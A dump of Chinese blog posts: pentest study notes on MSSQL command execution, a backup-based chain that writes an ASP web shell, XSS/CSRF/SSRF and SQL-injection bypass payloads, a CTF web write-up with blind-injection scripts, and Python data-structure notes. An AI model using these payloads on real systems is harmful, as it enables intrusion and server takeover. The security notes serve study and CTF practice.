原因:读文件可以使用hex()方式绕过引号，但写文件out_file’’的引号不可忽略 mssql提权原理:在没降权的情况下,MSSQL的服务是以system权限运行的.但如果mssql服务是以users组或者guests组降权运行的话,会导致下面一系列的操作进行不了. mssql提权相对轻松，利用XP_CMDSHELL,Sp_OACreate等储存过程直接提权.(前提储存过程健在). 由于ActiveX的支持，你能在SQL Server中使用VBS/WSH123declare @o int exec sp_oacreate &apos;wscript.shell&apos;, @o out exec sp_oamethod @o, &apos;run&apos;, NULL, &apos;notepad.exe&apos;Username: &apos;; declare @o int exec sp_oacreate &apos;wscript.shell&apos;, @o out exec sp_oamethod @o, &apos;run&apos;, NULL, &apos;notepad.exe&apos; -- 执行系统命令，xp_cmdshell(S)，SQL Server 2005默认是关闭的。你需要admin权限1234EXEC master.dbo.xp_cmdshell &apos;cmd.exe dir c:&apos;用ping简单的测试一下，用之前先检查一下防火墙和嗅探器EXEC master.dbo.xp_cmdshell &apos;ping &apos;如果有错误，或者union或者其他的什么，你都不能直接读到结果。 如果用户拥有管理员sa权限则可以用sp_configure重修开启它。1234EXEC sp_configure &apos;show advanced options&apos;,1//允许修改高级参数RECONFIGUREEXEC sp_configure &apos;xp_cmdshell&apos;,1 //打开xp_cmdshell扩展RECONFIGURE SQL Server中的一些特殊的表(S)1234567Error Messagesmaster..sysmessagesLinked Serversmaster..sysserversPassword (2000和2005版本的都能被破解，这俩的加密算法很相似)SQL Server 2000: masters..sysxloginsSQL Server 2005 : sys.sql_logins SQL Server的其它内置程序(S)12345678910111213141516171819202122命令执行 (xp_cmdshell)exec master..xp_cmdshell &apos;dir&apos;注册表操作 (xp_regread)xp_regaddmultistringxp_regdeletekeyxp_regdeletevaluexp_regenumkeysxp_regenumvaluesxp_regreadxp_regremovemultistringxp_regwriteexec xp_regread HKEY_LOCAL_MACHINE, &apos;SYSTEM\\CurrentControlSet \\Services\\lanmanserver\\parameters&apos;, &apos;nullsessionshares&apos; exec xp_regenumvalues HKEY_LOCAL_MACHINE, &apos;SYSTEM \\CurrentControlSet \\Services\\snmp\\parameters\\validcommunities&apos;管理服务(xp_servicecontrol)媒体(xp_availablemedia)ODBC 资源 (xp_enumdsn)登录 (xp_loginconfig)创建Cab文件 (xp_makecab)域名列举 (xp_ntsec_enumdomains)杀进程 (need PID) (xp_terminate_process)新建进程 (实际上你想干嘛都行)sp_addextendedproc ‘xp_webserver’, ‘c:\\temp\\x.dll’ exec xp_webserver写文件进UNC或者内部路径 (sp_makewebtask) mssql差异备份拿shell 几条命令，就是通过备份数据库的方式将文件写入网站目录12345678alter/**/database/**/[Hospital]/**/set/**/recovery/**/full--declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/database/**/[Hospital]/**/to/**/disk=@d/**/with/**/init--drop/**/table/**/[itpro]--create/**/table/**/[itpro]([a]/**/image)--declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/log/**/[Hospital]/**/to/**/disk=@d/**/with/**/init--insert/**/into/**/[itpro]([a])/**/values(0x3C25657865637574652872657175657374282261222929253EDA)--declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x65003A005C007700650062005C007A002E00610073007000/**/backup/**/log/**/[Hospital]/**/to/**/disk=@d/**/with/**/init--drop/**/table/**/[itpro]--declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/log/**/[Hospital]/**/to/**/disk=@d/**/with/**/init-- 其中红色的“Hospital”既是数据库名，这个要根据自己的情况来修改，然后黄色的“0x3C25657865637574652872657175657374282261222929253EDA”是一句话“&lt;%eval request(“a”)%&gt;”的内容，橙色的“0x65003A005C007700650062005C007A002E00610073007000”为备份的路径”e:webz.asp” XSS一般而言，存在4类: 反射型XSS：依赖用户行为触发 Hacker——发现存在反射XSS的URL——根据输出点的环境构造XSS代码——进行编码、缩短(可有可无，是为了增加迷惑性)——发送给受害人——受害打开后，执行XSS代码——完成hacker想要的功能(获取cookies、url、浏览器信息、IP等等) 存储型XSS：自动触发 储蓄型XSS其实和反射型XSS差不多，只是储蓄型把数据保存到服务端，而反射型只是让XSS游走在客户端上。下面是我在某处网站上检测到的储蓄XSS DOMXSS：依赖用户行为，DOM发生变化, 也有反射存储 DOM XSS是基于在js上的。而且他不需要与服务端进行交互，像反射、储蓄都需要服务端的反馈来构造xss，因为服务端对我们是不可见的 FLASH XSS 由于flash是可以内嵌执行js代码，所以还存在一种flashxss漏洞 针对前端，还有很多不熟悉的地方，需要多学习。 总结的挺全了,关于DOM XSS和反射型、存储型的区别在于它不依赖与服务器端的响应，而是由js解析dom树后输出在html页面中,相比反射型而言危害更大,因为它可以直接绕过浏览器防护。 另说到浏览器防护，就得提一提CSP CSP http://lorexxar.cn/2016/08/08/ccsp/ 这篇文章的大佬说的相当清楚，CSP写在header处用于浏览器识别防护。另外bypass的方式很多，根据具体情况而定，在这个大佬的博客里也介绍了很多。实战还没挖过这种漏洞，所以也只是理论基础== 对抗XSS HTTP Only/ip绑定cookie 过滤输入(filter,服务端，htmkentities,htmlspecialchars,)和输出(转义、编码) 设置新的Cookie标志? 设置一个HTTP标头? (dom)输出到script时，做jsencode，document.write时，如果输出到事件或脚本，做jsencode，如果输出到html内容或属性，做htmlencode 技巧 http://www.freebuf.com/articles/web/20282.html 大小写、字符编码绕过(字符实体,String.fromCharCode) 注释符打通 标签过滤不全，标签绕过 事件后跟location来绕过编码 事件过滤不全，事件绕过 针对ip的过滤 进制转换(10进制,8进制) url特性:http://www.baidu.com@10.10.10.10和http://10.10.10.10其实一样 xip.io绕过 。兼容 302跳转 XSS能用来干什么 获取cookie GET/POST操作 钓鱼（伪造一个登录框） 获取浏览器（UA、插件）和系统信息（OS、控件） css history hack 结合其他环境（java）获取信息，例如ip WORM:感染+传播 xss shell: 结合csrf xss: 攻击客户端(js爆破缓存目录、下载、执行木马) XSS防御策略 针对反射型、存储型和DOM型存在不同的防御措施 dom型的防御1输出到script时，做jsencode，document.write时，如果输出到事件或脚本，做jsencode，如果输出到html内容或属性，做htmlencode 另两种 白名单、黑名单限制+输入输出字符编码 编码样式为: (http://www.freebuf.com/articles/web/9977.html)1234561.在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码2.在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码3.在事件中输出，需要进行javascriptencode4.在css中输出，用encodeForCSS()函数5.在地址中输出，先检查是否http防止伪协议绕过，另做urlencode6.使用富文本时，使用XSS规则引擎进行编码过滤 XSS worm原理12341. Ajax2. 攻击者发现目标网站存在XSS漏洞，并且可以编写 XSS 蠕虫。3. 利用宿主 （如博客空间） 作为传播源头进行 XSS 攻击。4. 当其他用户访问被感染的空间时，XSS 蠕虫就继续感染。 绕过同源策略的方式 (http://www.cnblogs.com/2050/p/3191744.html)123456781. document.domain(跨子域)2. JSONP(callback方式跨域传递JSON数据)3. CORS(AJAX跨域方法)4. window.name跨域5. window.postMessage跨域传送6. crossdomain.xml(Flash跨域)7. location.hash8. cookie的domain属性(子域向父域传递cookie信息) 另几个不是很熟，就不记录了== Cookie有哪些参数，Secure什么用1234secure： 仅在HTTPS使用HTTP Only： 防止客户端(js)访问SameSite=Lax(仅POST禁止)/Strict(GET也不允许跨域传送Cookie)expire: 规定 cookie 的有效期 CSRF参数可以被攻击者预测 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 用一张图片可以表示CSRF种类 GET/POST方式 JSON Hijacking(通过构造callback从某个jsonp接口获得用户的json数据信息) (http://static.hx99.net/static/drops/web-15556.html) FLASH CSRF (http://static.hx99.net/static/drops/tips-2031.htmlhttps://blog.nuptzj.cn/post/134)[利用jsonp或上传swf进行csrf]) CSRF的防范以及存在的缺陷 (不完全解决)12当用户关闭页面时，清除session；设置低时效session(不能解决打开标签页后再打开伪造请求页造成的csrf) (不完全解决)12检查referer是否是本站(不能解决跨协议空referer) CSRF 如何不带Referer访问,绕过Referer 跨协议时referer为空,例如data://12&lt;iframe src=\"data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==\"&gt;base64为&lt;form method=post action=http://a.b.com/d&gt;&lt;input type=text name='id' value='123'/&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit();&lt;/script&gt; 另referer可能白名单限制不严，导致referer的绕过 (不完全解决/简单)12当表单提交时向form设置隐藏token,同表单一起post后验证(token可能被xss获取) (复杂)12对每个敏感信息获取请求增加验证码(极其影响用户体验) (防止JSON HiJacking)123在json数据头部加入while(1)原理:让攻击代码会陷入死循环中，无法将敏感信息发送到攻击者的服务器上，这样就防止了信息泄露；而正常的客户端代码可以正确地处理返回的JSON数据，它可以先将“while(1);”去掉再正常处理。 (HTTP-Headers)1在http头/协议层添加token验证[JS一般无法获得header处的token信息] CSRF的危害 篡改目标网站上的用户数据； 盗取用户隐私数据； 作为其他攻击向量的辅助攻击手法； 传播CSRF蠕虫。 结合xss造成更大的危害 SSRF很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。这种形式的攻击称为服务端请求伪造攻击如果应用程序对用户提供的URL和远端服务器返回的信息没有进行合适的验证和过滤，就可能存在这种服务端请求伪造的缺陷 挖掘 从WEB功能上寻找 123456分享：通过URL地址分享网页内容转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览在线翻译：通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等图片加载与下载：通过URL地址加载或下载图片图片、文章收藏功能未公开的api实现以及其他调用URL的功能 从URL关键字中寻找 1share/wap/url/link/src/source/target/u/3g/display/sourceURl/imageURL/domain SSRF 漏洞的验证基本判断（排除法）(URL和看请求)[譬如发送到自己vps，查看log看请求ip是否来自服务器ip,或者借助dnslog进行判断] 漏洞危害12345可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息攻击运行在内网或本地的应用程序（比如溢出）对内网web应用进行指纹识别，通过访问默认文件实现攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）利用file协议读取本地文件等 SQL注入类型1234567891、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。4、联合查询注入，可以使用union的情况下的注入。5、堆查询注入，可以同时执行多条语句的执行时的注入。 原理 所谓SQL注入，就是通过把SQL命令插入到Web 表单 提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句 SQLI能用来干什么12345绕过登陆验证读取数据库内数据读取服务器文本数据向服务器写入shell执行系统命令 SQLI思路，首先测试什么12345678910111213141516171819类型过滤字符waf数字型和字符型区别提交的类型不同:id=1 and 1=1#id=2&apos; and 1=1#报错：单引号 注释(--, #, /*comment*/, /*!mysql*/, ), 除0, 类型错误堆查询: 支持: asp/asp.net/php + mssql php + postgreSQL 不支持: php + mysql, asp/asp.net/php/java + access, java + oracleIF: mysql: SELECT IF (1=1,&apos;true&apos;,&apos;false&apos;) mssql: IF (1=1) SELECT &apos;true&apos; ELSE SELECT &apos;false&apos;16hex: SELECT CHAR(0x66)(S) SELECT 0x5045(M) (这不是一个整数，而会是一个16进制字符串） And(0)*2报错原理1select count(*),concat((select database()),floor(rand(0)*2))a from information_schema.tables group by a floor(rand(0)*2):011011011插入相同值, 第二次计算不同: 保证在开始的查询结果中, 不能让虚表中存在0, 1键值 首先建立了一个虚表 取第一条数据，执行floor(rand(0) * 2)，结果为0（第一次计算），查询虚表，发现键值0不存在，在进行一次计算，结果为1（第一次插入），插入到表中； 取出第二条数据，执行floor(rand(0) 2)，结果为1（第二次计算），查询虚表，记录存在，直接count()加一； 取出第三条数据，执行floor(rand(0) * 2)，结果为0（第三次计算），查询虚表，发现不存在键值0，在进行一次计算，结果1(第二次插入)，插入到虚表中作为虚表的主键，与之前的1冲突，这时候就会报错了。 报错注入的10种方式 见《企业级代码审计》书后 常用的:updatexml,extractvalue()1这俩原理类似，都是第二个参数需要Xpath格式字符串，但赋值不是,所以报错 还有个exp(~)12exp()是为以e为底的对数函数。将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值。与exp()结合，就会造成一个溢出，导致报错 绕过登陆界面12345678admin&apos; --admin&apos; #admin&apos;/*&apos; or 1=1--&apos; or 1=1#&apos; or 1=1/*&apos;) or &apos;1&apos;=&apos;1--&apos;) or (&apos;1&apos;=&apos;1-- 还有个就是ctf中常出现的利用union绕过MD5(pass)的检查11234 &apos; AND 1=0 UNION ALL SELECT &apos;admin&apos;,&apos;81dc9bdb52d04dc20036dbd8313ed055 SQLI单引号’被过滤怎么办1234561. 如果是数字型注入，只在用到引号的函数处受到影响2. 如果存在宽字节注入,只在用到引号的函数处受到影响3. 白盒审计中，如果没有过滤\\，可以用\\转义，让引号逃逸4. 二次注入5. 二次编码注入6. 过滤位置不全[譬如$_REQUEST过滤了，但忽略了$_SERVER] 宽字节注入原理，在哪里编码，如何防范 (http://blog.csdn.net/zl20117/article/details/53610975)三种情况12341.在PHP中使用mysql_query(“set names GBK”);指定三个字符集（客户端、连接层、结果集）都是GBK编码。2.使用set names UTF-8指定了UTF-8字符集，并且也使用转义函数进行转义。有时候，为了避免乱码，会将一些用户提交的GBK字符使用iconv函数（或者mb_convert_encoding）先转为UTF-8，然后再拼接入SQL语句。3.使用iconv进行字符集转换，将UTF-8转为GBK，同时，set names字符集为GBK。提交%e9%8c%a6即可。 归根到底还是数据库、操作系统、web应用所使用的字符集不一致。 在《企业级代码审计》一书中介绍了三种解决方法： 在执行查询前先SET NAMES ‘GBK’,character_set_client=binary 使用mysql_set_charset(‘gbk’)设置编码，然后使用mysql_real_escape_string()函数被参数过滤 使用pdo方式,在php5.3.6及以下版本需要设置setAttribute(PDO::ATTR_EMULATE_PREPARES,false)来禁用prepared statements的仿真效果 不同位置处的注入 update后: left join order by后: (http://www.cnblogs.com/lcamry/p/5762710.html) limit后：(https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html) insert后：闭合构造多个insert内容或让单引号逃逸 SQLI绕过WAF思路1234567891. 大小写混合,双写绕过2. 替换关键字 (一次正则)3. 使用编码(URL编码/十六进制编码/Unicode编码/)4. 使用注释(//, -- , /**/, #, --+,-- -, ;，--a),内联注释/!**/只有MySQL能识别5. 等价函数与命令()6. 特殊符号 `(+-.可作连接,@定义变量,)7. HTTP参数控制(HPP)8. 缓冲区溢出9. ()代替空格 MySQL有哪些表，有什么用12345678910mysql库user：db：table_priv:columns_priv:user表身份： Host + User + Password权限：user-all &gt; db &gt; tables_priv &gt; columns_priv插件 plugin两个视图库information_schema、performance_schema(5.0以下没有，所以只能暴力跑表) sqlmap mssql执行命令遇见中文目录1--hex --proxy=&quot;http://127.0.0.1:8080&quot;用burp代理发送命令，把带有中文目录的命令用小葵转成hex，在burp中对应替换 字数多了，markdown编辑器变得好卡，下篇文章继续…","tags":[{"name":"安全","slug":"安全","permalink":"https://doggy-test.github.io/tags/安全/"}]},{"title":"python数据结构复习(三)","date":"2017-04-26T14:14:00.000Z","path":"2017/04/26/python数据结构复习-三/","text":"关于字符串的KMP匹配算法 参考的是这篇文章:http://www.cnblogs.com/yjiyjige/p/3263858.html但是对于next数组的计算方法直到现在还是难以理解1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#encoding=UTF-8def BF_Match(str1, str2): str1_len = len(str1) str2_len = len(str2) if str1_len&gt;=str2_len: #长度判断，如果要匹配的串更长，就不用比了 max_time = str1_len-str2_len+1 #最大比较次数 for _time in range(max_time): i = _time j = 0 while j &lt; str2_len and str1[i] == str2[j]: i = i + 1 j = j + 1 if j == str2_len: print _time return True else: continue else: return False\"\"\"kmp算法的核心就在于失败函数的计算。在BF算法中，如果匹配失败，就每次都会从下一次字符开始重新比较，可是这个操作 可能是冗余的，所以失败函数的计算尤为重要\"\"\"#这一段还不是很理解def f(str2): fail_list = [-1 for i in range(len(str2)+1)] j = 0 k = -1 #初始为-1 while j &lt; len(str2): if k == -1 or str2[j] == str2[k]: j += 1 k += 1 fail_list[j] = k else: #没有匹配到就回到上一个 k = fail_list[k] return fail_list\"\"\"针对失败算法，可以对BF算法进行改进\"\"\"def KMP(str1,str2): fail_list = f(str2) #先进行失败函数的计算 str1_len = len(str1) str2_len = len(str2) if str1_len&gt;=str2_len: #长度判断，如果要匹配的串更长，就不用比了 #max_time = str1_len-str2_len+1 无需计算最大比较次数 #for _time in range(max_time): i = 0 j = 0 while i&lt;len(str1) and j&lt;len(str2): if str1[i] == str2[j]: i += 1 j += 1 else: j = fail_list[j] #下次直接从j的位置开始比 if j == len(str2):#匹配到完整串长 print i-j return True else: return Falsestr1 = 'abcabcaabcabcabbac'str2 = 'abcabcabba'print BF_Match(str1,str2)print KMP(str1,str2)","tags":[{"name":"数据结构","slug":"数据结构","permalink":"https://doggy-test.github.io/tags/数据结构/"}]},{"title":"python数据结构复习(二)","date":"2017-04-22T23:34:00.000Z","path":"2017/04/23/python数据结构复习-二/","text":"关于栈和对列 提到栈，在数据结构和在内存中是不同的两个概念，当然堆也是。这篇文章讲的挺好:http://blog.csdn.net/wolenski/article/details/7951961，我把它精简下 关于堆 堆在数据结构中是利用完全二叉树的结构来维护一组数据，是一种经过排序的树形数据结构。 而在内存中，堆区一般由程序员分配释放，若程序员不释放，程序结束时可能由OS回收 。 关于栈 数据结构中栈是一种具有后进先出性质的数据结构，相当存储物体的箱子，要想取得物品，需要先拿后放入的。 而在内存中， 栈区由编译器自动分配释放，存放函数的参数值，局部变量的值等。 二者在内存中的区别 1.申请方式不同 2.申请后系统的响应 3.申请大小的限制 4.申请效率的高低 5.堆和栈中的存储内容 可以在:http://blog.csdn.net/hairetz/article/details/4141043 具体查看 好像有点偏题了…回到数据结构的栈来，在 https://github.com/facert/python-data-structure-cn/blob/master/3.基本数据结构/3.5.Python实现栈/README.md 中，栈和队列的实现只用了简单的内部函数，感觉对原理的介绍不是太清楚，所以还是用了另一种方法 栈的python实现 栈需要三个初始化变量:表示栈大小的size，表示栈底的top，以及存储栈内容本身的数组[] 12345678910111213141516171819202122232425262728class Stack: def __init__(self,size): self.size=size self.stack=[] self.top=-1 def push(self,item): #入栈之前检查栈是否已满 if self.isfull(): return False else: self.stack.append(item) self.top=self.top+1 def pop(self): # 出栈之前检查栈是否为空 if self.isempty(): return False else: self.top=self.top-1 return self.stack.pop() def isfull(self): return self.top+1==self.size def isempty(self): return self.top==-1 def now_size(self): return self.top+1 队列的python实现 而队列的实现需要4个初始化变量，front和rear替代了栈里的top，是因为队列是先进先出的，如果仅靠一个，是无法实现队列的。front表示对头，rear表示对尾。入队向对尾添加，出队从对头出1234567891011121314151617181920212223242526272829303132333435#encoding=UTF-8class Queue(): def __init__(self,size): self.size=size self.front= -1 self.rear= -1 self.queue=[] def isfull(self): return self.rear-self.front+1==self.size def isemtpy(self): return self.front == self.rear def enqueue(self,item): #入队操作 if self.isfull(): return False else: self.queue.append(item) self.rear += 1 #对尾后移 def dequeue(self,item): #出队操作 if self.isemtpy(): return False else: self.queue.pop(0) self.front += 1 #对头后移 def getsize(self): if self.isemtpy(): return None else: return self.rear - self.front+1 另外关于队列和链表还有一些很有意思的小题目，譬如链表的比较，链表的逆序或者回文字串的判断等等，以后有时间，会在这里继续更新==","tags":[{"name":"数据结构","slug":"数据结构","permalink":"https://doggy-test.github.io/tags/数据结构/"}]},{"title":"python数据结构复习(一)","date":"2017-04-19T06:09:00.000Z","path":"2017/04/19/python数据结构复习-一-1/","text":"这几天打算复习下数据结构的知识，顺便在这里记录下好了 首先是无序和有序链表。 共同点： 都需要先定义个节点类，包含next的指向和它的值。另外，删除、判空、获得长度的方法都一样 不同点: 针对添加: 有序链表的增加需要遍历链表，寻找添加新节点的地方。而无序链表只需更改头即可 针对搜索 有序链表是存在顺序的，所以如果前面元素比它小，后面元素比它大，就可以判断找不到了，而无需遍历链表 节点类的实现12345678910111213141516class Node: def __init__(self,initdata): self.data = initdata self.next = None def getData(self): return self.data def getNext(self): return self.next def setData(self,newdata): self.data = newdata def setNext(self,newnext): self.next = newnext 无序链表的实现1234567891011121314151617181920212223242526272829303132333435363738394041424344class Unlist: def __init__(self): self.head = None #头结点 def add(self,item): nodeitem = Node(item) #新增节点 nodeitem.setNext(self.head) #当前头设为下个节点 self.head = nodeitem #重建头 def isempty(self): return self.head == None #判断头是否存在 def size(self): current = self.head #获得头 count = 0 while current != None: #往后增加 count = count + 1 current = current.getNext() return count def search(self,item):#搜索 current = self.head #获得头结点 while current != None: if current.getData() == item: return True else: current = current.getNext() return False #删除节点 \"\"\" 节点删除需要两步，第一步找到元素，第二步进行删除 需要两个点:删除和删除的前一个点 \"\"\" def remove(self,item): current = self.head #取得头 previous = None while current!=None and current.getData()!=item: previous = current current = current.getNext() if previous == None: #删除的若是头结点 self.head = current.getNext() #设置下个为头即可 else: previous.setNext(current.getNext()) #前一个头指向后一个即可 有序链表的实现(这里只实现添加和搜索)123456789101112131415161718192021222324def search(self,item): current = self.head #获得头结点 count = 0 while current.getData() &lt; item: count+=1 current = current.getNext()#找到 if current.getData() == item: return count else: return Falsedef add(self,item): nodeitem = Node(item) current = self.head previous = None #记录之前的节点 while current and current.getData()&lt;nodeitem.getData(): previous = current current = current.getNext() #找到比他大的位置 #如果是头 if previous == None: nodeitem.setNext(current) self.head = nodeitem else: previous.setNext(nodeitem) nodeitem.setNext(current) 关于链表的操作，其实关键在于找到操作的位置(利用.getnext()) 下一篇复习堆栈和队列的知识 参考：https://github.com/facert/python-data-structure-cn/blob/master/","tags":[{"name":"数据结构","slug":"数据结构","permalink":"https://doggy-test.github.io/tags/数据结构/"}]},{"title":"陕西某CTF web题记录","date":"2017-04-18T11:39:00.000Z","path":"2017/04/18/陕西某CTF-web题记录/","text":"上个周末做了个陕西的CTF WEB，记录下。 Web75 抽抽奖 打开链接http://117.34.111.15/，是一个抽奖页面查看源代码有个奇怪的js文件:/js/Jquery.js，整理下代码，关键点在这里:尝试rotateFunc(0x1,0x9d,’1’)提示你想要flag吗？后来尝试rotateFunc(0x1,0x9d,’flag’)成功 Web100 继续抽 当时只做到0-100的爆破，结果居然在100-200，坑！ 这里应该考察的是简单的访问逻辑: js查看源码&gt;AJAX访问token.php&gt;得到token&gt;带着token以及encode(md5(某项值))访问get.php&gt;返回json串 当时的脚本: 12345678910111213141516171819202122232425262728293031323334#encoding=UTF-8import hashlibimport requestsimport jsondict1 = &#123; 'a':'1e','b':'1d','c':'1c','d':'1b','e':'1a','f':'19', '0':'4f','1':'4e','2':'4d','3':'4c','4':'4b','5':'4a','6':'49','7':'48','8':'47','9':'46',&#125;headers = &#123; 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36'&#125;def encode(str1): md5_str = hashlib.md5(str1).hexdigest() encode_str = '' for _str in md5_str: if dict1.has_key(_str): encode_str += dict1[_str] return encode_strdef gettoken(s): r1 = s.get(url='http://117.34.111.15:81/token.php',headers=headers) return json.loads(r1.content)def getflag(s,json_code,flag_id): url = 'http://117.34.111.15:81/get.php?token=&#123;0&#125;&amp;id=&#123;1&#125;'.format(json_code,encode(flag_id)) r = s.get(url=url,headers=headers) print json.loads(r.content)['text']if __name__ == '__main__': s = requests.session() r = s.get(url='http://117.34.111.15:81',headers=headers) for i in xrange(0,100): json_code = gettoken(s) getflag(s,json_code,str(i)) 改成200应该就可以了 Web125 Wrong 打开链接http://117.34.111.15:85/，扫到一处.index.php.swp 用的mt_srand(time())设置的种子，存在漏洞，可以进行爆破另外要使$_SESSION[‘userlogin’]和$_GET[‘login’]相等，可以设置提交空cookie以及login为空先获得服务器的时间 转换成时间戳后加30 放入burp进行爆破，得到flag Web150 Just a test访问链接http://117.34.111.15:83/，是一个购物站，在这里找到一处注入http://117.34.111.15:83/eagle-ui-25-fsb-blue-with-funnel-metal-safety-gas-can-25-gal-capacity 可以用sqlmap直接跑，3个库 Test中有个fl@g的表手工读列名 由于extractvalue的特性需要截断才能获得完整的flag 这里的考点应该是报错注入，以及对表名有特殊字符比如@的处理（这里用``可以进行查询） Web125 So easy 当时想了好久如何绕过对空格的过滤，到最后也没做出来。转一下writeup吧！ 关键点在这里:12345678910function show($username)&#123; global $conn; $sql = \"select role from `user` where username ='\".$username.\"'\"; $res = $conn -&gt;query($sql); if($res-&gt;num_rows&gt;0)&#123; echo \"$username is \".$res-&gt;fetch_assoc()['role']; &#125;else&#123; die(\"Don't have this user!\"); &#125;&#125; 因为过滤了空格(可以用()来绕过)以及注释符，所以需要通过构造两个等号的条件来进行注入 譬如通过构造的逻辑等式来进行盲注的判断 所以这题也类似，可以写出脚本，这里也收集了两个 前一个构造的是(0=?)=0 ?为1时才相等1234567891011121314# --coding:utf-8-- import requestsurl=\"http://117.34.111.15:89/?action=show\"passwd=\"\"lists=\"1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm\"for i in xrange(1,33): print i for p in lists: param=&#123;'username':\"-1'=(ascii(mid((passwd)from(\"+str(i)+\")))=\"+str(ord(p))+\")='0\"&#125; print requests.post(url,data=param).content if \"admin\" in requests.post(url,data=param).content: passwd=passwd+p breakprint passwd 后一个是(1=?)=1 ?为1时才相等12345678910111213import requests url=\"http://117.34.111.15:89/?action=show\"ans=\"\"dic=\"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"for i in xrange(33):for j in dic:data=&#123;\"username\":\"admin'=(substring((select(passwd)from(user))from(-&#123;0&#125;))='&#123;1&#125;&#123;2&#125;')='1\".format(str(i),str(j),str(ans))&#125;content=requests.post(url,data=data).contentif len(content)&gt;30:ans =j+ansprint ansbreak 其实是一样的 另外这题也考察了mysql的字符特性，这点在p牛的博客中有提及[https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html] sql查询时123456789function login($username,$passwd)&#123; $username = trim(strtolower($username)); $passwd = trim(strtolower($passwd)); if($username == 'admin')&#123; die(\"you can't login this as admin!\"); &#125; $sql = \"select * from `user` where username='\".$username.\"' and passwd='\".$passwd.\"'\"; echo mysql_real_escape_string($sql);&#125; 可以采用利用admin%c2的方式来绕过，原因p牛已经写得很清楚了: 就是Mysql在转换字符集(这里是把utf8转换成latin1)的时候，将不完整的字符给忽略了。而%c2恰好是utf8的第一个字符","tags":[{"name":"writeup","slug":"writeup","permalink":"https://doggy-test.github.io/tags/writeup/"}]},{"title":"创建博客初衷","date":"2017-04-16T21:38:00.000Z","path":"2017/04/17/Hello/","text":"一直都想有个属于自己的博客，之前想着用Django写个来着，后来知道了Hexo，我这种前端渣渣还是不要献丑的好–。 接触安全已经一年有余了，可是和大牛们的差距真的好大，所以希望通过博客来督促自己学习下去，并且对学习到的知识总结归纳一下，顺带着提高下自己语言组织的能力 不忘初心，方得始终，加油！ –2017.4.17","tags":[{"name":"心情随笔，生活感悟","slug":"心情随笔，生活感悟","permalink":"https://doggy-test.github.io/tags/心情随笔，生活感悟/"}]}]